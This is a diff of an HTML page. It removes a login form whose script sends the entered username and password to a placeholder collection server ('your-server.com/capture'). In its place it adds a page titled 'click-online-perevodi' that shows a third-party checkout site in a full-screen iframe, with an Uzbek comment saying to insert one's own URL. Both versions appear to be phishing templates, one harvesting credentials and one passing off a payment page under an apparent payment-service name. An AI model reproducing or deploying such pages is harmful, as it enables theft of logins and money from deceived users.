@@ -1,36 +1,29 @@
 <!DOCTYPE html>
-<html>
+<html lang="uz">
 <head>
-    <title>Login</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>click-online-perevodi</title>
     <style>
-        body { font-family: Arial, sans-serif; }
-        .login-form { width: 300px; margin: 0 auto; }
-        .login-form input { width: 100%; padding: 10px; margin: 5px 0; }
-        .login-form button { width: 100%; padding: 10px; background-color: #4CAF50; color: white; border: none; cursor: pointer; }
+        /* Sahifaning body qismini to'liq ekranga moslashtiramiz */
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            width: 100%;
+        }
+        
+        /* Iframe'ni butun ekranga moslashtirish */
+        iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
     </style>
 </head>
 <body>
-    <div class="login-form">
-        <h2>Login</h2>
-        <form id="loginForm">
-            <input type="text" name="username" placeholder="Username" required>
-            <input type="password" name="password" placeholder="Password" required>
-            <button type="submit">Login</button>
-        </form>
-    </div>
-    <script>
-        document.getElementById('loginForm').onsubmit = function(e) {
-            e.preventDefault();
-            const formData = new FormData(this);
-            const data = Object.fromEntries(formData.entries());
-            fetch('https://your-server.com/capture', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            }).then(response => response.json()).then(data => {
-                alert('Submitted data: ' + JSON.stringify(data));
-            });
-        };
-    </script>
+
+    <iframe src="https://checkout.easypaygame.com/hpp/cgi_h2SCERgOcjxROb0p?"></iframe> <!-- Bu yerda o'z URL manzilingizni joylashtiring -->
+
 </body>
 </html>
